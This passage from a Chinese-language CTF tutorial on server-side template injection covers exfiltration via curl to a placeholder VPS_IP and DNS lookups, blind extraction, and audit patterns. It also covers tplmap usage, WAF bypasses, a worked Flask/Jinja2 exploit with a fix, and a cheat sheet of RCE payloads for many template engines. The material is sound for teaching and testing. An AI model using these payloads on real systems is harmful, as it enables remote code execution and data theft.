{{cycler.__init__.__globals__.os.popen("curl 'http://VPS_IP:8000/?x='$(base64 -w0 /flag)").read()}}
```

**各语言编码命令对照**：

| 语言 | 编码命令 |
|------|---------|
| Linux | `base64 -w0 /flag` |
| Linux | `cat /flag \| base64 -w0` |
| Python（目标） | `__import__("base64").b64encode(open("/flag","rb").read())` |

### 7.4 DNS 外带

HTTP 出网受限但 DNS 可用时，将数据编码放入子域名：

```bash
nslookup 666c61677b73737469.你的域名
```

DNS 标签最长 63 字符，长数据需分块。

**使用 dig 命令**：

```bash
dig 666c61677b73737469.你的域名
```

### 7.5 盲注式逐字符外带

当无法使用带外且没有回显时，可以通过延时判断逐字符推断数据：

```jinja2
# 判断 /flag 第一个字符是否为 'f'
{% if lipsum.__globals__.__builtins__["open"]("/flag").read()[0] == "f" %}
  {{lipsum.__globals__.os.popen("sleep 3").read()}}
{% endif %}
```

通过逐字符延时对比，可以提取出文件内容。这种方法速度慢但可靠。

### 7.6 利用错误信息泄露

先让代码执行成功，再故意制造错误让结果出现在异常信息中：

```jinja2
# 如果某个位置能显示异常信息
{{lipsum.__globals__.__builtins__["open"]("/flag").read() / 0}}
```

通过在读取结果上触发算术错误，使结果出现在异常回溯中。

### 7.7 文件写入获取结果

将命令执行结果写入 Web 可访问目录：

```jinja2
{{cycler.__init__.__globals__.os.popen("id > /var/www/html/result.txt").read()}}
{{cycler.__init__.__globals__.os.popen("cat /flag > /var/www/html/flag.txt").read()}}
```

前提：知道 Web 根目录、进程有写权限、写入文件可被 HTTP 访问。

 **避坑**：
- 没有收到外带请求不一定代表 SSTI 不存在，可能是容器无法出网、缺少工具或命令执行函数不可用。
- 延时判断要取多次平均值，排除网络波动。
- 优先读文件（无需出网），再考虑外带。

---

## 第8章：源码审计要点

审计时追踪数据流：

```
用户输入 → 是否拼接 → 是否传入模板解析函数 → 上下文对象 → 输出位置
```

### 8.1 Python 危险模式

```python
# Flask / Jinja2
render_template_string(user_input)
render_template_string("Hello " + user_input)
Environment().from_string(user_input).render()
Template(user_input).render()

# 隐含路径：用户内容从数据库取出后渲染
template = "Hello " + db_get_user_content(user_id)
render_template_string(template)

# Mako
from mako.template import Template
Template(user_input).render()

# Tornado
tornado.template.Template(user_input).generate()
```

### 8.2 PHP 危险模式

```php
// Twig
$template = $twig->createTemplate($_POST["template"]);
echo $template->render();

// Smarty
$smarty->display("string:" . $_GET["name"]);
$smarty->fetch("string:" . $_POST["template"]);

// Blade（Laravel）
echo Blade::compileString("Hello " . $input);
```

### 8.3 Java 危险模式

```java
// FreeMarker
Template t = new Template("user", new StringReader(userInput), config);
t.process(dataModel, writer);

// Thymeleaf
templateEngine.process(userControlledTemplate, context);

// Spring MVC 返回用户可控视图名
@GetMapping("/view")
public String view(@RequestParam String viewName) {
    return viewName;  // 可能导致模板注入
}

// Velocity
Velocity.evaluate(context, writer, "", userInput);
```

### 8.4 Node.js / Ruby / Go 危险模式

```javascript
// Node.js
ejs.render(userInput, data);
pug.render(userInput, data);
nunjucks.renderString(userInput, data);
Handlebars.compile(userInput)(data);
_.template(userInput)(data);  // Lodash template
```

```ruby
# Ruby
ERB.new(user_input).result(binding)
Slim::Template.new(user_input).render
```

```go
// Go
template.New("page").Parse(userInput) // 后接 Execute() 则危险
```

### 8.5 审计检查清单

```text
[ ] 是否有 render_template_string() 调用？
[ ] 是否有 Environment().from_string() 调用？
[ ] 是否有 Mako Template() 调用？
[ ] 是否有 Tornado Template().generate()？
[ ] 是否有 Twig createTemplate()？
[ ] 是否有 Smarty display("string:...")？
[ ] 是否有 FreeMarker Template(StringReader)？
[ ] 是否有 Thymeleaf templateEngine.process()？
[ ] 是否有 EJS/Pug/Nunjucks render()？
[ ] 是否有 ERB.new().result(binding)？
[ ] 是否有 Go template.Parse()？

[ ] 如果上述调用存在，参数是否来自用户输入？
[ ] 用户输入是否经过拼接、format 或 f-string 处理？
[ ] 模板上下文中传入了哪些危险对象？
[ ] 是否启用了沙箱或安全策略？
```

 **避坑**：`str.format()` 的属性访问（`{0.__class__}`）不属于模板引擎，应和 SSTI 区分。

---

## 第9章：自动化探测与工具

### 9.1 Python 批量探测脚本

```python
import requests
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "http://target/"
param = sys.argv[2] if len(sys.argv) > 2 else "name"

probes = {
    "Jinja2/Twig/Tornado": "ssti{{7*7}}test",
    "Mako/FreeMarker/Thymeleaf": "ssti${7*7}test",
    "EJS/ERB": "ssti<%= 7*7 %>test",
    "Pug": "ssti#{7*7}test",
    "Smarty": "ssti{$smarty.version}test",
    "Go template": 'ssti{{printf "%s" "ssti"}}test',
    "Velocity": "ssti#set($x=7*7)$xtest",
}

for engine, payload in probes.items():
    try:
        r = requests.get(target, params={param: payload}, timeout=10)
        print(f"[{engine}] status={r.status_code} len={len(r.text)} time={r.elapsed.total_seconds():.2f}s")
        if "49" in r.text or "7777777" in r.text or "sstitest" in r.text:
            print(f"  ---> 可疑! {r.text[:200]}")
    except Exception as e:
        print(f"[{engine}] 请求失败: {e}")
```

### 9.2 tplmap 工具使用指南

tplmap 是专门针对 SSTI 的自动化工具，支持多种模板引擎。

**安装**：

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

**基本用法**：

```bash
# GET 参数注入
python tplmap.py -u "http://target/?name=*"

# POST 表单注入
python tplmap.py -u "http://target/" -d "name=*"

# JSON 注入
python tplmap.py -u "http://target/api" -d '{"name":"*"}' -H "Content-Type: application/json"

# 请求头注入
python tplmap.py -u "http://target/" --headers "User-Agent: *"

# Cookie 注入
python tplmap.py -u "http://target/" --cookie "name=*"
```

**常用选项**：

```bash
# 指定引擎类型（跳过识别阶段）
python tplmap.py -u "http://target/?name=*" --engine Jinja2

# 尝试 RCE
python tplmap.py -u "http://target/?name=*" --os-shell

# 执行单条命令
python tplmap.py -u "http://target/?name=*" -c "cat /flag"

# 读取文件
python tplmap.py -u "http://target/?name=*" --read /flag

# 爆破参数名（为未指定参数时）
python tplmap.py -u "http://target/?*"

# 带 Cookie 登录态
python tplmap.py -u "http://target/?name=*" --cookie "session=abc123"

# 自定义 HTTP 方法
python tplmap.py -u "http://target/?name=*" -X POST

# 设置代理（用于 BurpSuite 调试）
python tplmap.py -u "http://target/?name=*" --proxy "http://127.0.0.1:8080"
```

**tplmap 支持的引擎**：

```
Engine: Jinja2, Jade, Smarty, Mako, JavaScript (JS),
        Tornado, Nunjucks, Python, Ruby, Twig, Freemarker,
        Velocity, Go, ERB, EJS, Pug, Handlebars
```

**tplmap 探测流程**：

1. **盲注检测**：测试 `{{7*7}}`、`${7*7}` 等通用探测表达式
2. **引擎指纹**：根据响应差异识别具体模板引擎
3. **上下文枚举**：检查可访问的对象和函数
4. **注入测试**：尝试多种已知的利用链
5. **后利用**：读文件、写文件、命令执行、Shell

**tplmap 的局限性**：

```text
1. payload 针对已知漏洞版本，定制化引擎或新版本可能无效
2. 高并发可能触发 WAF
3. 需要 Python 2.7 或 3.x（部分依赖年久失修）
4. 不能处理复杂的自定义过滤逻辑
5. 盲注场景效率低
6. 遇到 request 参数过滤时不灵活
```

 **避坑**：tplmap 失败不代表不存在 SSTI。许多 CTF 题目专门设计绕过 tplmap 的检测逻辑。工具只是辅助，手工分析才是根本。

### 9.3 BurpSuite SSTI 检测

**使用 Intruder 批量探测**：

1. 捕获正常请求
2. 发送到 Intruder
3. 在目标参数位置标记 payload
4. 加载 SSTI 探测 payload 列表：

```text
ssti{{7*7}}
ssti${7*7}
ssti<%= 7*7 %>
ssti#{7*7}
ssti{$smarty.version}
```

5. 对比响应长度和状态码

**使用 Burp Suite 扩展**：

- **Turbo Intruder**：高速自定义 payload 注入
- **Autorize**：检测越权时的 SSTI 点
- **Collaborator**：用于无回显外带测试

### 9.4 工具使用原则

- 工具的 payload 可能只适用于旧版本，失败不代表不存在 SSTI。
- 先用低并发避免触发 WAF 限流。
- 登录态、CSRF Token 需手工处理。
- 源码可见时优先手工构造，不动用自动化工具。

 **避坑**：工具探测到 RCE 时先确认不会破坏环境（如执行了重启、删除等危险操作）。

---

## 第10章：WAF 绕过思路

### 10.1 更换输入位置

同一模板可能接收多个输入源，某个参数过滤严不代表其他也严。

- GET → POST → JSON → Cookie → 请求头 → 文件名
- 例：昵称有 WAF，但 `User-Agent` 没有相同过滤

```bash
# 测试多个输入位置
curl -G "http://target/" --data-urlencode "name={{7*7}}"
curl "http://target/" -H "User-Agent: {{7*7}}"
curl "http://target/" -H "X-Forwarded-For: {{7*7}}"
curl "http://target/" -H "Referer: {{7*7}}"
curl "http://target/" -H "Cookie: name={{7*7}}"
```

### 10.2 更换请求方法 / Content-Type

```bash
# 表单
curl -X POST -d "name={{7*7}}" http://target/

# JSON
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}' http://target/

# Multipart
curl -X POST -F "name={{7*7}}" http://target/

# PUT 或 PATCH 方法
curl -X PUT -d "name={{7*7}}" http://target/
```

### 10.3 同名参数污染

```text
?name=safe&name={{7*7}}
?name={{7*7}}&name=safe
```

取决于后端处理同名参数的策略（取第一个 / 取最后一个 / 拼接）。

### 10.4 统一绕过技术对照

| 技术 | Jinja2 | Twig | Mako | EJS | ERB |
|------|--------|------|------|-----|-----|
| 字符串拼接 | `"a"~"b"` | `"a"~"b"` | `"a"+"b"` | `"a"+"b"` | `"a"+"b"` |
| 属性访问替换 | `attr()` | `attribute()` | — | — | — |
| 请求参数注入 | `request.args.x` | `app.request.x` | — | — | — |
| 十六进制转义 | `\x5f` | — | — | — | — |
| Unicode 转义 | `_` | — | — | — | — |
| URL 传值 | `request.args` | `app.request.query` | — | `query` 对象 | `params` |
| 编码绕过 | URL 编码 | URL 编码 | URL 编码 | URL 编码 | URL 编码 |

### 10.5 不依赖 Shell 的读文件方案

| 语言 | 直接读文件 |
|------|-----------|
| Python | `open("/flag").read()` |
| PHP | `file_get_contents("/flag")` |
| Java | `Files.readAllBytes(Paths.get("/flag"))` |
| Node.js | `fs.readFileSync("/flag","utf8")` |
| Ruby | `File.read("/flag")` |

### 10.6 经典 WAF 绕过案例

**场景一：过滤 `{{` 和 `}}`**

```jinja2
# 使用语句标签
{% print cycler.__init__.__globals__.os.popen("id").read() %}

# 使用 {% %} 绕过后再用 print 输出
{% set x = cycler.__init__.__globals__.os.popen("id").read() %}{% print x %}
```

**场景二：过滤 `__class__`、`__base__` 等**

```jinja2
# 使用 request.args 传属性名
?name={{()|attr(request.args.a)|attr(request.args.b)()}}&a=__class__&b=__base__

# 字符串拼接
{{()|attr("__cla" ~ "ss__")}}
```

**场景三：过滤单引号和双引号**

```jinja2
# 使用 request 对象传值
{{config[request.args.k]}}&k=SECRET_KEY

# 使用 Cookie 传值
{{()|attr(request.cookies.a)}}
Cookie: a=__class__
```

 **避坑**：先确定过滤位置（浏览器/WAF/框架/模板引擎/输出），不同阶段的绕过方法完全不同。

---

## 第11章：完整例题（Flask + Jinja2）

### 11.1 题目源码

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
app.config["SECRET_KEY"] = "test_secret_key"

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    template = "<h1>Hello, " + name + "</h1>"
    return render_template_string(template)
```

### 11.2 逐步利用

**Step 1**- 确认回显：

```text
GET /?name=test_admin
→ <h1>Hello, test_admin</h1>
```

**Step 2**- 数学表达式测试：

```text
GET /?name={{7*7}}
→ <h1>Hello, 49</h1>
```

确认表达式被服务端执行。

**Step 3**- 引擎指纹：

```text
GET /?name={{7*"7"}}
→ <h1>Hello, 7777777</h1>
```

字符串重复确认 Jinja2。

**Step 4**- 读配置：

```text
GET /?name={{config["SECRET_KEY"]}}
→ <h1>Hello, test_secret_key</h1>
```

**Step 5**- 读文件（短链）：

```text
GET /?name={{lipsum.__globals__.__builtins__["open"]("/flag").read()}}
```

**Step 6**- 短链失败时枚举子类：

```text
GET /?name={% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=="catch_warnings" %}{{c.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}{% endif %}{% endfor %}
```

**Step 7**- 尝试命令执行：

```text
GET /?name={{cycler.__init__.__globals__.os.popen("pwd; ls -la /").read()}}
```

**Step 8**- 绕过过滤（如果关键字被过滤）：

```text
GET /?name={{()|attr(request.args.a)|attr(request.args.b)()}}&a=__class__&b=__base__
```

### 11.3 漏洞修复

```python
# 错误
template = "<h1>Hello, " + name + "</h1>"
return render_template_string(template)

# 正确（用户输入作为变量值）
return render_template_string("<h1>Hello, {{ name }}</h1>", name=name)

# 推荐（使用独立模板文件）
return render_template("index.html", name=name)
```

核心：**用户输入始终是数据，不是模板源码**。

**更全面的修复方案**：

```python
# 1. 使用 render_template（渲染文件，不是字符串）
from flask import render_template
return render_template("index.html", name=name)

# 2. 使用 Jinja2 的 SandboxedEnvironment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
return template.render(name=name)

# 3. 输入验证与净化
import re
if re.search(r'[\{\{|\}\}|\$\{|<\%|\%>]', user_input):
    abort(400, "Invalid input")
```

---

## 第12章：常见错误与陷阱

### 12.1 语法混用

```text
错误：在 Twig 中使用 Python __class__ 链
错误：在 Nunjucks 中使用 Python os.popen
错误：在 Go Template 中使用 {{7*7}}
错误：在 Django Template 中使用 __class__.__base__.__subclasses__()
错误：在 EJS 中尝试 Python 对象链

正确：先确认模板引擎，再选择对应语言的利用链
```

### 12.2 命令执行但看不到输出

```text
错误：使用 os.system("id") 并期望看到输出
      → os.system() 返回退出码，不是输出

正确：使用 os.popen("id").read() 或 subprocess.check_output()
```

### 12.3 固定下标陷阱

```text
错误：从网上复制 __subclasses__()[276]
      → 不同环境下标完全不同

正确：用循环按类名查找，或先输出所有类名再确定下标
```

### 12.4 自动转义误解

```text
错误：认为 HTML 自动转义能阻止 SSTI
      → 自动转义只处理输出中的 < > 等字符
      → 不阻止模板引擎执行 {{7*7}}

正确：自动转义和 SSTI 是两回事，SSTI 发生在转义之前
```

### 12.5 前端模板与后端模板混淆

```text
错误：看到页面上显示 49 就认为是 SSTI
      → 可能是 Vue.js / Angular 前端模板编译的结果

正确：用 curl 查看原始 HTML 响应来判断
```

### 12.6 沙箱与黑名单混淆

```text
错误：字符串绕过对沙箱同样有效
      → 沙箱在运行时限制属性访问，不是字符串过滤

正确：先判断是黑名单还是沙箱，再选择绕过方法
```

### 12.7 忽略容器环境限制

```text
错误：默认目标有 bash、curl、wget
      → 精简容器可能只有 busybox 或什么都没有

正确：优先用语言原生 API（Python open()，Java Files.readAllBytes 等）
```

### 12.8 二次渲染被忽略

```text
错误：一次注入没有回显就放弃
      → 数据可能被存储后在另一个页面/功能点渲染

正确：保存数据后再找预览、导出、后台管理等页面
```

### 12.9 输入位置单一化

```text
错误：只测试 GET 参数
      → POST、Cookie、请求头、JSON 体都可能是入口

正确：全量测试所有用户可控的输入点
```

### 12.10 过早使用自动化工具

```text
错误：一开始就用 tplmap 跑
      → 可能触发 WAF、破坏环境、错过手工发现的细节

正确：先手工探测和确认，再用工具辅助深入
```

---

## 知识总结表

### SSTI 全流程速查

| 阶段 | 操作 | 关键命令 / Payload |
|------|------|--------------------|
| 探测 | 数学表达式 | `{{7*7}}` `${7*7}` `<%=7*7%>` |
| 指纹 | 字符串乘法 | `{{7*"7"}}`（Jinja2 → 7777777，Twig → 49） |
| 指纹 | 查看报错 | 构造 `{{7*` 等语法错误 |
| 上下文 | 读配置 | `{{config}}`（Flask） |
| 上下文 | 枚举变量 | `{{().__class__.__base__.__subclasses__()}}` |
| 读文件 | Python open() | `{{lipsum.__globals__.__builtins__["open"]("/flag").read()}}` |
| RCE | Jinja2 短链 | `{{lipsum.__globals__.os.popen("id").read()}}` |
| RCE | Jinja2 子类链 | `{% for c in ().__class__.__base__.__subclasses__() %}...{% endfor %}` |
| RCE | Mako | `${__import__("os").popen("id").read()}` |
| RCE | Tornado | `{% import os %}{{os.popen("id").read()}}` |
| RCE | Twig 旧版 | `{{_self.env.registerUndefinedFilterCallback("exec")}}` |
| RCE | Twig map | `{{["id"]\|map("system")\|join}}` |
| RCE | Smarty | `{system("id")}` |
| RCE | FreeMarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| RCE | Thymeleaf | `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x` |
| RCE | Thymeleaf 带输出 | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x` |
| RCE | EJS | `<%= require("child_process").execSync("id").toString() %>` |
| RCE | ERB | `<%= IO.popen("id").read %>` |
| RCE | Velocity | `#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))` |
| RCE | Pug | `#{global.process.mainModule.require("child_process").execSync("id")}` |
| RCE | Nunjucks | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}` |
| RCE | Go（依赖 FuncMap） | `{{run "id"}}` |
| 无回显 | 延时 | `{{...os.popen("sleep 5").read()}}` |
| 无回显 | HTTP 外带 | `{{...os.popen("curl http://VPS_IP:8000/$(base64 /flag)")}}` |
| 无回显 | DNS 外带 | `nslookup 数据.你的域名` |
| 无回显 | 文件写入 | `{{...os.popen("id > /var/www/html/x.txt").read()}}` |
| 绕过 | 点号过滤 | `attr()` 过滤器 |
| 绕过 | 关键字过滤 | 字符串拼接 `~` |
| 绕过 | 引号过滤 | `request.args.x` 传值 |
| 绕过 | 花括号过滤 | `{% print %}` 语句 |
| 绕过 | 空格过滤 | 去掉多余空格或用 `%09` |
| 修复 | 安全写法 | `render_template("固定模板", 变量=值)` |

### Python 对象链速查

| 魔术属性 | 作用 | 示例 |
|----------|------|------|
| `__class__` | 获取当前对象的类 | `().__class__` → `<class 'tuple'>` |
| `__base__` | 获取父类 | `().__class__.__base__` → `<class 'object'>` |
| `__mro__` | 获取继承链（元组） | `().__class__.__mro__` → `(tuple, object)` |
| `__subclasses__()` | 获取所有已加载子类 | `().__class__.__base__.__subclasses__()` → 类列表 |
| `__globals__` | 获取函数所在模块的全局变量 | `lipsum.__globals__` → 全局变量字典 |
| `__builtins__` | 获取 Python 内置函数 | `__globals__["__builtins__"]` → 内置函数 |
| `__init__` | 构造函数 | `catch_warnings.__init__` → 构造方法函数对象 |
| `__dict__` | 对象属性字典 | `config.__dict__` → 配置属性 |

### 引擎特征快速识别

| 特征 | 引擎 |
|------|------|
| `{{7*"7"}}` → `7777777` | Jinja2 |
| `{{7*"7"}}` → `49` | Twig |
| `${7*7}` 有效 | Mako / FreeMarker / Thymeleaf |
| `{$smarty.version}` 有效 | Smarty |
| `<%= 7*7 %>` 有效 | EJS / ERB |
| `{{printf "%s" "x"}}` 有效 | Go template |
| `#{7*7}` 有效 | Pug |
| `#set($x=7*7)$x` → `49` | Velocity |
| `{% import os %}` 有效 | Tornado |
| `{{range.constructor}}` 可用 | Nunjucks（Node.js） |
| `{{config}}` 输出配置 | Flask + Jinja2 |
| `{{app}}` 输出应用对象 | Symfony + Twig |
| `{{_context}}` 输出所有变量 | Twig |

### 各语言读文件速查

| 语言 | 读文件 | 命令执行 |
|------|--------|----------|
| Python | `open("/flag").read()` | `os.popen("id").read()` |
| PHP | `file_get_contents("/flag")` | `system("id")` |
| Java | `Files.readAllBytes(Paths.get("/flag"))` | `Runtime.getRuntime().exec("id")` |
| Node.js | `fs.readFileSync("/flag","utf8")` | `child_process.execSync("id")` |
| Ruby | `File.read("/flag")` | `\`id\`` 或 `IO.popen("id").read` |
| Go | 依赖 FuncMap | 依赖 FuncMap |

### 各语言执行命令的注意事项

| 语言 | 常见错误 | 正确做法 |
|------|----------|----------|
| Python | `os.system("id")` 无输出 | `os.popen("id").read()` |
| Java | `Runtime.exec("id")` 无输出 | 读取 `Process.getInputStream()` |
| Node.js | `exec("id")` 异步无返回 | `execSync("id").toString()` |
| PHP | `exec("id")` 仅最后一行 | `passthru("id")` 或 `shell_exec("id")` |
| Ruby | `system("id")` 返回 bool | `\`id\`` 或 `%x(id)` |

---

## 附录：引擎利用难度对比

| 模板引擎 | 语言 | 利用难度 | 默认安全程度 | 常见利用链长度 |
|----------|------|---------|-------------|---------------|
| Mako | Python | 低 | 低 | 1-2 步 |
| Tornado | Python | 低 | 低 | 1-2 步 |
| Smarty | PHP | 低 | 中 | 1 步 |
| Jinja2 | Python | 中 | 中 | 2-4 步 |
| Twig | PHP | 中 | 中 | 2-4 步 |
| EJS | Node.js | 中 | 低 | 1-2 步 |
| ERB | Ruby | 中 | 低 | 1-2 步 |
| FreeMarker | Java | 中高 | 中 | 2-3 步 |
| Thymeleaf | Java | 中高 | 高 | 3-5 步 |
| Velocity | Java | 高 | 中 | 3-5 步 |
| Nunjucks | Node.js | 中 | 中 | 2-3 步 |
| Pug | Node.js | 中 | 中 | 1-2 步 |
| Go template | Go | 高 | 高 | 依赖 FuncMap |
| Handlebars | Node.js | 高 | 高 | 依赖 Helper |
| Django Template | Python | 极高 | 极高 | 仅自定义过滤器 |
| Blade | PHP | 极高 | 高 | 仅 `compileString` |

> **难度说明**："低"表示确认注入后 1-2 步即可 RCE；"高"表示需要特定版本、特定配置或特定上下文对象。

---

> **总结**：SSTI 的本质是用户输入从"数据位"进入了"代码位"。判断流程是先数学探测、再指纹识别、再上下文探测、最后尝试利用。Jinja2 优先使用 lipsum/cycler 短链，失败再走子类枚举。其他引擎各有特点，不可混用。绕过时要先定位过滤阶段，再选对应方法。CTF 中优先读 flag，不必强求 RCE。
